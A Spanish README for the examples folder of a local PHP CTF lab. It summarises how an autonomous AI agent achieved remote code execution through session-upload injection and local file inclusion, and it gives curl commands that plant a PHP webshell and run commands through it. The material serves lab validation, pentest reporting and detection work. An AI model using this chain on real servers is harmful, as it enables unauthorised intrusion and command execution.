# Ejemplos de explotación — PHP2Shell Lab

Este directorio contiene **informes reales** de explotaciones exitosas ejecutadas por Vulnerator contra el lab, como ejemplos de referencia y validación de que las cadenas de ataque son reproducibles.

---

## `chain-a-exploitation-report.md`

**Engagement:** `ctf-php2shell-chainA`  
**Fecha:** 21 octubre 2026  
**Atacante:** Vulnerator/Hermes (agente OODA autónomo)  
**Resultado:** ✅ **RCE CONFIRMADO** — ejecución arbitraria de comandos como `www-data` (uid=33)

### Resumen

Explotación completa de **Chain A** (Session File Injection + LFI → RCE):

1. **Session fixation:** SID controlado `ctfchainA00000000000000000000000`
2. **Inyección:** POST multipart con payload PHP en el `filename` del upload
3. **Persistencia:** fichero de sesión con código PHP crudo (gracias a `cleanup=Off`)
4. **Ejecución:** LFI en `/vuln.php?page=/tmp/sessions/sess_<SID>` → include del fichero → RCE

### Comandos ejecutados

```bash
# Prueba de concepto
GET /vuln.php?page=/tmp/sessions/sess_ctfchainA00000000000000000000000&c=id
→ uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Otros comandos de demostración
whoami          → www-data
uname -a        → Linux 7.0.12-linuxkit aarch64 GNU/Linux
head -3 /etc/os-release → Debian GNU/Linux 13 (trixie)
```

### Target comprometido

- **PHP:** 8.2.34 (vulnerable, < 8.2.35)
- **SAPI:** fpm-fcgi
- **Servidor:** nginx/1.31.7
- **Usuario proceso:** www-data (uid=33)

### Evidencia

El informe completo incluye:
- Peticiones HTTP completas (POST multipart + GET LFI)
- Respuestas del servidor con stack traces
- Salida verbatim de comandos ejecutados
- 7 hallazgos confirmados con mapeo MITRE ATT&CK
- Validación de alcance (todo tráfico a `host.docker.internal:18080`)

---

## Cómo usar estos ejemplos

### 1. Como validación del lab

Los informes demuestran que el lab está correctamente configurado y las chains son reproducibles. Si montas el lab y no consigues RCE, compara tu setup con los detalles del informe (versión PHP, config `upload_progress`, endpoints).

### 2. Como plantilla para tus propios engagements

El formato del informe (`REPORT.md`) es el output estándar de Vulnerator. Puedes usarlo como referencia para:
- Estructurar tus propios informes de pentesting
- Ver qué evidencia recopiló el agente (peticiones, respuestas, comandos)
- Entender el flujo OODA (Observe → Orient → Decide → Act)

### 3. Como PoC para desarrollo de detecciones

Si estás desarrollando reglas de detección (SIEM, IDS/IPS, WAF), el informe documenta:
- Patrones de peticiones HTTP (multipart con payload en filename)
- Indicadores de LFI (paths como `/tmp/sessions/sess_<SID>`)
- Comportamiento post-explotación (comandos de recon típicos: `id`, `whoami`, `uname`)

---

## Reproducir la explotación manualmente

Si quieres replicar Chain A sin Vulnerator, sigue la guía en [`../TESTING.md`](../TESTING.md), sección "Test 1: Chain A". El script Python incluido reproduce exactamente los pasos del informe.

Alternativamente, usa curl:

```bash
SID="mytest000000000000000000000000"

# Paso 1: Inyectar payload
curl -X POST http://127.0.0.1:18080/index.php \
  -H "Cookie: PHPSESSID=$SID" \
  -F "PHPSESSID=$SID" \
  -F "PHP_SESSION_UPLOAD_PROGRESS=x" \
  -F 'f=@-;filename="<?php system($_GET['"'"'c'"'"']); ?>"' <<< "dummy"

# Paso 2: Ejecutar comando vía LFI
curl -s "http://127.0.0.1:18080/vuln.php?page=/tmp/sessions/sess_${SID}&c=id"
```

---

## Añadir más ejemplos

Si ejecutas otros engagements (Chain C, Chain D, etc.) y quieres documentarlos:

1. Descarga el informe desde el contenedor Kali:
   ```bash
   docker cp vulnerator-ai-kali-1:/artifacts/<engagement-id>/REPORT.md \
     labs/php2shell-lab/examples/<nombre-descriptivo>.md
   ```

2. Actualiza este `README.md` con entrada para el nuevo ejemplo.

---

**Estos informes son resultado de testing en entorno CTF local autorizado. No contienen datos sensibles reales.**
